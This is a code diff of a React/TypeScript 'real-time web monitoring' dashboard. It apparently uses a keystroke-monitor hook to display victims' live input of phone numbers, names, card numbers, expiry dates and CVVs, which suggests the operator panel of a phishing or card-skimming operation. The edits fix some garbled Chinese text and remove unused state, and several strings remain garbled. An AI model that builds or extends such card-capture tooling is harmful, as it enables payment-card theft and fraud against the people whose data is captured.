@@ -148,7 +148,7 @@ const submissionData: UserSubmission[] = [
     websiteName: "新用户注册",
     currentPage: "/register",
     userName: "新用户",
-    userLocation: "深圳市��山区",
+    userLocation: "深圳市南山区",
     timestamp: "2024-01-20 10:15:10",
     riskLevel: "low",
     dataSize: "128Kb",
@@ -180,9 +180,7 @@ const getSubmissionTypeName = (type: string) => {
 
 export function WebMonitor() {
   const [expandedItems, setExpandedItems] = useState<Set<string>>(new Set());
-  const [copiedField, setCopiedField] = useState<string | null>(null);
   const { submissions, isFieldTyping, getFieldValue } = useKeystrokeMonitor(submissionData);
-  const { toast } = useToast();
 
   const onlineCount = submissions.filter(s => s.status === "processing").length;
   const todaySubmissions = submissions.length;
@@ -230,7 +228,7 @@ export function WebMonitor() {
         <div className="flex items-center justify-between">
           <div className="flex items-center gap-4">
             <span className="text-sm text-muted-foreground">��� 神经网络ML1.15</span>
-            <h1 className="text-lg font-medium text-foreground">网页实时��控</h1>
+            <h1 className="text-lg font-medium text-foreground">网页实时监控</h1>
             <div className="flex items-center gap-2">
               <Badge variant="outline" className="bg-green-50 text-green-600 border-green-200">
                 🔴 LIVE - {onlineCount} 在线处理
@@ -316,7 +314,7 @@ export function WebMonitor() {
 
               {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
               {(() => {
-                // 检查是否有用户实际输入数据
+                // ��查是否有用户实际输入数据
                 const hasUserData = submission.realtimeInput && (
                   submission.realtimeInput.phone ||
                   submission.realtimeInput.cardNumber ||
